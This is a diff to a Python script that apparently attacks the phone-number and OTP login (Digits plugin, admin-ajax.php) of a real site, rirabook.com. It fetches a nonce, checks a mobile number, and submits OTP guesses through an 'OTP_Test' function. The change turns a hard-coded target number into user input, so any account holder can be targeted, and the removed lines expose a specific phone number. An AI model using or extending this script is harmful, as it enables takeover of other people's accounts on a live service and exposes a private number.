@@ -20,13 +20,15 @@ def banner():
                                                                         (c) Rirabook . All rights reserved""")
 
 
-
 banner()
-i = nonce_cod.nonce(start='')
+
+i = nonce_cod.once_kid_suop(kid='')
 print(i)
+
 nonce = input('nonce code :')
 system('cls')
 
+P_number = int(input("Enter Phone number +98"))
 ip = requests.post("https://icanhazip.com").text
 
 url = 'https://rirabook.com/wp-admin/admin-ajax.php'
@@ -36,7 +38,7 @@ json = {'accountkit': 0,
 
 data = {'action':'digits_check_mob',
         'countrycode':'+98', # decoded url
-        'mobileNo':9050756226,
+        'mobileNo':P_number,
         'csrf':nonce,
         'login':1,
         'username':'',
@@ -46,7 +48,7 @@ data = {'action':'digits_check_mob',
         'digits':1,
         'json':1,
         'whatsapp':0,
-        'mobmail':9050756226,
+        'mobmail':P_number,
         'dig_otp':'',
         'dig_nounce':nonce,
         'digits_redirect_page':'https://rirabook.com/'}
@@ -78,7 +80,7 @@ def OTP_Test():
 
         data_vrify = {'action':'digits_verifyotp_login',
                       'countrycode':'%2B98',
-                      'mobileNo':9050756226,
+                      'mobileNo':P_number,
                       'otp':sh,
                       'dig_ftoken':-1,
                       'csrf':nonce,
